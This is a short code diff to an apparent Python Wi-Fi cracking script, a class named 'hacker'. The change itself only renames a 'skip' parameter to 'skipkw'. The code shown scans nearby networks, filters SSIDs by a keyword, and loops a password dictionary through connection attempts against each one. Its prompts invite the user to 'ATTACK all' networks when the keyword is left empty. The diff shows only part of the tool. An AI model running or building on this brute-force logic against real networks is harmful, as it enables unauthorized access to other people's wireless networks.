@@ -59,12 +59,12 @@ class hacker():
         return 0
             
         
-    def go(self,ssidkw='',skip=''):
+    def go(self,ssidkw='',skipkw=''):
         self.scan()
         ssids = [ssid for ssid in self.ssids if ssidkw in ssid] if ssidkw else self.ssids
         for _ssid in ssids:
             print("Attacking SSID {}".format(_ssid))
-            if skip and skip in _ssid:
+            if skipkw and skipkw in _ssid:
                 continue
             for password in self.passdic:
                 ifconnect = self.connect(_ssid,password)
@@ -79,5 +79,5 @@ class hacker():
 
 if __name__ == '__main__':
     ssidkw = input("Target SSID KEYWORD(Leave it empty to ATTACK all):\t")
-    skip = input("Ignored SSID KEYWORD(Leave it enpty to ATTACK all):\t")
-    hacker().go(ssidkw=ssidkw,skip=skip)
+    skipkw = input("Ignored SSID KEYWORD(Leave it enpty to ATTACK all):\t")
+    hacker().go(ssidkw=ssidkw,skipkw=skipkw)
